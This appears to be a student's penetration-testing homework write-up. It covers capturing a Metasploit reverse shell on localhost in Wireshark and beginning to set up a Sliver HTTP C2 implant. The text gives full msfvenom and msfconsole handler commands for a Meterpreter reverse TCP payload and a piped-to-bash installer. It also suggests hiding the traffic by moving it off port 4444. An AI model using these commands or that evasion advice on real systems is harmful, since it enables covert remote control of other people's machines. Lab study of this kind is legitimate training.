# Shells

## a. Snif venom

In this one I will try to use Wireshark to snif out a msfvenon reverse shell tcp malware on my local machine. 

To make things easier, I will disable any internet access so theres less stuff going on in Wireshark. Pinging localhost first to make sure we are listening to the right interface: 

<img src="h6.4.png" alt=img/>

Great, the pings are being listened to, now we can do our exploit. Also making sure we arent connected to the internet.

<img src="h6.1.png" alt=img/>

I will now start my msfconsole and run the msfvenom binary which I've created in my previous homework assignemnt h5 using 

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o reverse_shell.elf`

so I have the reverse.shell binary still and I will use it for this exercise. Let's open up msfconsole

<img src="h6.2.png" alt=img/>

`msfconsole`

`use exploit/multi/handler`

`set payload linux/x86/meterpreter/reverse_tcp`

`set LHOST localhost`

`set LPORT 4444`

<img src="h6.3.png" alt=img/>

Now on the other terminal we will run the binary of the msfvenon malware using `./reverse_shell.elf`

When we look at wireshark, we can immediately see a bunch of packets being sent over the IP of 127.0.0.1 on port 4444 and 37256

<img src="h6.5.png" alt=img/>

This kind of traffic would seem unusual because it's using port 4444 which is often associated with Metasploit and also it's a connection that's constantly listening with a lot of consistent traffic. That could indicate a reverse shell or some compromised service is listening.

We could mask this by switching to another more obscure or unknown port or even HTTP 80 port.



## b. Sliver HTTP

So in this one we want to make a sliver implant that communicates over HTTP.

First we need to install sliver using `curl https://sliver.sh/install|sudo bash`

Then we will start the sliver service `systemctl start sliver`

Now we will use sliver with `sliver`

<img src="h6.6.png" alt=img/>

References:

https://terokarvinen.com/tunkeutumistestaus/

https://osqa-ask.wireshark.org/questions/20423/pshack-wireshark-capture/#:~:text=The%20ACK%20indicates%20that%20a,also%20transmitting%20some%20more%20data.

https://seamlessintelligence.com.au/sliver_1.html

https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2/2f6500892f78dbaae0bd4d41fc72e44aef6759ee



